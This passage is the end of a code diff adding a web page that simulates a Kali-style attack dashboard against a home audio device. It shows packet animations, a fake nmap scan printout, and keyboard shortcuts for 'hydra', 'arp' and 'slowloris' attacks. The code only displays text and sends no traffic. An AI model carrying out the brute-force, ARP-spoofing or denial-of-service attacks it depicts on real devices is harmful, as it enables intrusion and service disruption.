+            const length = Math.sqrt(Math.pow(x2 - x1, 2) + Math.pow(y2 - y1, 2));
+            const angle = Math.atan2(y2 - y1, x2 - x1) * 180 / Math.PI;
+            
+            line.style.width = length + 'px';
+            line.style.left = x1 + 'px';
+            line.style.top = y1 + 'px';
+            line.style.transform = `rotate(${angle}deg)`;
+            
+            document.getElementById('networkViz').appendChild(line);
+        }
+
+        function createDataPacket(from, to, isAttack = false) {
+            const packet = document.createElement('div');
+            packet.className = 'data-packet' + (isAttack ? ' attack' : '');
+            
+            const fromRect = from.getBoundingClientRect();
+            const toRect = to.getBoundingClientRect();
+            const containerRect = from.parentElement.getBoundingClientRect();
+            
+            packet.style.left = (fromRect.left + fromRect.width / 2 - containerRect.left - 10) + 'px';
+            packet.style.top = (fromRect.top + fromRect.height / 2 - containerRect.top - 10) + 'px';
+            
+            document.getElementById('networkViz').appendChild(packet);
+            
+            setTimeout(() => {
+                packet.style.transition = 'all 1s ease-in-out';
+                packet.style.left = (toRect.left + toRect.width / 2 - containerRect.left - 10) + 'px';
+                packet.style.top = (toRect.top + toRect.height / 2 - containerRect.top - 10) + 'px';
+            }, 50);
+            
+            setTimeout(() => packet.remove(), 1100);
+        }
+
+        // Stop attack
+        function stopAttack() {
+            attackRunning = false;
+            document.getElementById('runButton').disabled = false;
+            document.getElementById('stopButton').disabled = true;
+            
+            // Update attack status
+            document.querySelectorAll('.attack-status').forEach(status => {
+                status.classList.remove('active');
+                status.classList.add('ready');
+            });
+            
+            addTerminalLine('^C', 'command');
+            addTerminalLine('Attack terminated by user.', 'error');
+            
+            // Clear any network animations
+            document.querySelectorAll('.connection-line, .data-packet').forEach(el => el.remove());
+        }
+
+        // Complete attack
+        function completeAttack() {
+            attackRunning = false;
+            document.getElementById('runButton').disabled = false;
+            document.getElementById('stopButton').disabled = true;
+            
+            // Update status
+            const statusEl = document.querySelector(`#${selectedAttack}Card .attack-status`);
+            statusEl.classList.remove('active');
+            statusEl.classList.add('ready');
+        }
+
+        // Close details
+        function closeDetails() {
+            document.querySelectorAll('.attack-details').forEach(details => {
+                details.classList.remove('active');
+            });
+        }
+
+        // Show network scan
+        function showNetworkScan() {
+            addTerminalLine('nmap -sn 192.168.1.0/24', 'command');
+            
+            setTimeout(() => {
+                addTerminalLine('Starting Nmap 7.91 scan...', 'output');
+                addTerminalLine('Nmap scan report for 192.168.1.1', 'output');
+                addTerminalLine('Host is up (0.0012s latency).', 'success');
+                addTerminalLine('MAC Address: 00:11:22:33:44:55 (Router)', 'output');
+                addTerminalLine('', 'output');
+                addTerminalLine('Nmap scan report for 192.168.1.101', 'output');
+                addTerminalLine('Host is up (0.0023s latency).', 'success');
+                addTerminalLine('MAC Address: AA:BB:CC:DD:EE:FF (AmpliPi)', 'output');
+                addTerminalLine('Open ports: 80/tcp (http), 5001/tcp (service), 7000/tcp (afs3-fileserver)', 'warning');
+                addTerminalLine('', 'output');
+                addTerminalLine('Nmap scan report for 192.168.1.105', 'output');
+                addTerminalLine('Host is up (0.0034s latency).', 'success');
+                addTerminalLine('MAC Address: 11:22:33:44:55:66 (Apple iPhone)', 'output');
+                addTerminalLine('', 'output');
+                addTerminalLine('Nmap done: 256 IP addresses (3 hosts up) scanned in 2.43 seconds', 'output');
+            }, 1000);
+        }
+
+        // Status indicators
+        function showSuccess() {
+            const indicator = document.getElementById('statusIndicator');
+            indicator.className = 'status-indicator success';
+            indicator.textContent = '✓';
+            setTimeout(() => {
+                indicator.className = 'status-indicator';
+            }, 1000);
+        }
+
+        function showFail() {
+            const indicator = document.getElementById('statusIndicator');
+            indicator.className = 'status-indicator fail';
+            indicator.textContent = '✗';
+            setTimeout(() => {
+                indicator.className = 'status-indicator';
+            }, 1000);
+        }
+
+        // Keyboard shortcuts
+        document.addEventListener('keydown', (e) => {
+            if (e.key === '1') selectAttack('hydra');
+            if (e.key === '2') selectAttack('arp');
+            if (e.key === '3') selectAttack('slowloris');
+            if (e.key === 'Enter' && !attackRunning) runSelectedAttack();
+            if (e.key === 'Escape' && attackRunning) stopAttack();
+            if (e.key === 'c' && e.ctrlKey) stopAttack();
+        });
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            initMatrixRain();
+            addTerminalLine('Kali Linux 2023.4 - The quieter you become, the more you are able to hear', 'output');
+            addTerminalLine('', 'output');
+            addTerminalLine('Target identified: AmpliPro Home Audio System at 192.168.1.101', 'warning');
+            addTerminalLine('Select an attack from the dashboard above to begin testing...', 'output');
+        });
+    </script>
+</body>
+</html>
